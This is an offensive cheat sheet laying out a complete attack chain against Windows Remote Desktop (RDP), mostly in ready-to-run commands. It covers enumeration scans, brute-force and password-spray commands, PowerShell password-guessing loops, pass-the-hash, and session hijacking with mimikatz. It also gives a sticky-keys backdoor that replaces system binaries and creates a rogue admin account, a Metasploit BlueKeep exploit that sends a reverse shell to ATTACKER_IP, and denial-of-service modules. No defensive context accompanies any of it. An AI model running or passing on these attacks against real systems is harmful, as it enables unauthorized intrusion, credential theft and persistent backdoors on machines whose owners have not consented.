# 1. RDP - COMPLETE ATTACK CHAIN <a name="rdp"></a>

## 1.1 THEORY & BACKGROUND

**Remote Desktop Protocol (RDP)**:
- **Protocol**: Proprietary Microsoft protocol
- **Default Port**: 3389/TCP
- **Purpose**: Graphical remote desktop access
- **Security**: Supports NLA (Network Level Authentication), TLS encryption

**Common Uses**:
- Remote server administration
- Virtual desktop infrastructure (VDI)
- Remote support

---

## 1.2 ENUMERATION PHASE

**Scan for RDP:**
```bash
# Nmap:
nmap -p 3389 --open 192.161.1.0/24

# With RDP scripts:
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info 192.161.1.100

# Detailed:
nmap -p 3389 -sV -sC 192.161.1.100

# Check for BlueKeep (CVE-2019-0708):
nmap -p 3389 --script rdp-vuln-ms12-020 192.161.1.100

# Masscan for large networks:
masscan -p3389 192.161.0.0/16 --rate=10000
```

**Enumerate RDP Details:**
```bash
# Using Nmap scripts:
nmap -p 3389 --script rdp-ntlm-info 192.161.1.100
# Returns: OS version, Computer name, Domain

# Check encryption:
nmap -p 3389 --script rdp-enum-encryption 192.161.1.100
# Shows: Supported encryption levels

# Check if NLA is enabled:
# NLA (Network Level Authentication) requires credentials before session
# If NLA disabled, can attempt BlueKeep or other pre-auth exploits
```

---

## 1.3 EXPLOITATION PHASE

### 1.3.1 Authentication Attacks

**Password Attacks:**

From Linux:
```bash
# Hydra:
hydra -l administrator -P passwords.txt rdp://192.161.1.100

# Multiple users:
hydra -L users.txt -P passwords.txt rdp://192.161.1.100

# Specific options:
hydra -l administrator -P passwords.txt rdp://192.161.1.100 -t 4 -V

# Crowbar:
crowbar -b rdp -s 192.161.1.100/32 -u administrator -C passwords.txt

# Ncrack:
ncrack -p 3389 -user administrator -P passwords.txt 192.161.1.100

# RDP brute force with crackmapexec:
crackmapexec rdp 192.161.1.100 -u administrator -p passwords.txt

# Password spray:
crackmapexec rdp 192.161.1.0/24 -u administrator -p 'Summer2023!' --continue-on-success
```

From Windows:
```powershell
# PowerShell brute force:
$passwords = Get-Content passwords.txt
foreach ($pass in $passwords) {
    $result = cmdkey /generic:"192.161.1.100" /user:administrator /pass:$pass
    
    # Attempt connection:
    try {
        mstsc /v:192.161.1.100 /admin
        # If successful, connection opens
        Write-Host "[+] Success: $pass"
        break
    } catch {
        Write-Host "[-] Failed: $pass"
    }
}

# Or using .NET:
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, "192.161.1.100")

$passwords = Get-Content passwords.txt
foreach ($pass in $passwords) {
    if ($context.ValidateCredentials("administrator", $pass)) {
        Write-Host "[+] Valid: administrator : $pass"
        break
    } else {
        Write-Host "[-] Invalid: $pass"
    }
}
```

**Pass-the-Hash (Restricted Admin Mode):**

```bash
# Check if Restricted Admin mode enabled:
crackmapexec smb 192.161.1.100 -u administrator -H 'NTLM_HASH' --exec-method smbexec

# If enabled, RDP with PTH:
# Using xfreerdp:
xfreerdp /u:administrator /pth:NTLM_HASH /v:192.161.1.100

# Enable Restricted Admin mode (requires admin on target first):
# Via registry:
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Then PTH works
```

### 1.3.2 Session Hijacking

**Hijack Active RDP Session:**

Requires SYSTEM privileges on target:

```powershell
# List sessions:
query user

# Output:
# USERNAME  SESSIONNAME  ID  STATE
# admin     rdp-tcp#0    2   Active
# user1     rdp-tcp#1    3   Active

# Hijack session 2 (becomes admin):
# Method 1: Using tscon
# Requires SYSTEM:
psexec -s cmd
tscon 2 /dest:console

# Method 2: Inject into session:
# Upload mimikatz:
C:\mimikatz.exe privilege::debug token::elevate ts::sessions

# Take over session:
C:\mimikatz.exe ts::remote /id:2

# Now controlling admin's RDP session!
```

**RDP Sticky Keys Backdoor:**

```bash
# From attacker with admin access:

# 1. Enable RDP if not enabled:
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 2. Enable firewall rule:
netsh advfirewall firewall set rule group="remote desktop" new enable=yes

# 3. Replace sethc.exe (sticky keys) with cmd.exe:
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# Or replace utilman.exe (accessibility):
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

# 4. RDP to login screen:
rdesktop 192.161.1.100

# 5. Press Shift 5 times (or click accessibility):
# CMD opens as SYSTEM!

# 6. Create admin account:
net user hacker Password123! /add
net localgroup administrators hacker /add

# 7. Login as hacker
```

### 1.3.3 RDP Exploits

**BlueKeep (CVE-2019-0708):**

Affects:
- Windows 7
- Windows Server 2008
- Windows Server 2008 R2
- Windows XP (if RDP enabled)

```bash
# Check if vulnerable:
nmap -p 3389 --script rdp-vuln-ms12-020 192.161.1.100

# Metasploit:
msfconsole
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.161.1.100
run

# If vulnerable:
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.161.1.100
set TARGET 2  # Depends on OS version
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
exploit

# Warning: This exploit can crash the system!
```

**Other RDP Vulnerabilities:**

```bash
# MS12-020 (DoS):
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
set RHOST 192.161.1.100
run

# DejaBlue (CVE-2019-1181, CVE-2019-1182):
# Metasploit module:
use exploit/windows/rdp/cve_2019_1182_rdp_rce

# Check for vulnerabilities:
nmap -p 3389 --script rdp-vuln* 192.161.1.100
```

---

## 1.4 POST-EXPLOITATION

**Once RDP Access Gained:**

From Linux:
```bash
# Connect with rdesktop:
rdesktop -u administrator -p Password123! 192.161.1.100

# Full screen:
rdesktop -u administrator -p Password123! -f 192.161.1.100

# Specific resolution:
rdesktop -u administrator -p Password123! -g 1920x1080 192.161.1.100

# Share local directory:
rdesktop -u administrator -p Password123! -r disk:share=/tmp 192.161.1.100

# With xfreerdp (better features):
xfreerdp /u:administrator /p:Password123! /v:192.161.1.100

# Full screen:
xfreerdp /u:administrator /p:Password123! /v:192.161.1.100 /f

# Share directory:
xfreerdp /u:administrator /p:Password123! /v:192.161.1.100 /drive:share,/tmp

# With clipboard:
xfreerdp /u:administrator /p:Password123! /v:192.161.1.100 +clipboard

# Multiple monitors:
xfreerdp /u:administrator /p:Password123! /v:192.161.1.100 /multimon

# Admin session:
xfreerdp /u:administrator /p:Password123! /v:192.161.1.100 /admin
```

**From Windows:**
```powershell
# GUI:
mstsc

# Command line:
mstsc /v:192.161.1.100 /admin

# With saved credentials:
cmdkey /generic:192.161.1.100 /user:administrator /pass:Password123!
mstsc /v:192.161.1.100

# Using PowerShell:
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("administrator", $password)
Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:192.161.1.100"
```

**Actions via RDP:**
- Full GUI access → easy file browsing, software installation
- Extract files via shared drives
- Install remote access tools (TeamViewer, AnyDesk, VNC)
- Dump credentials (mimikatz in GUI)
- Install persistence mechanisms
- Pivot to other systems
- Exfiltrate data

---
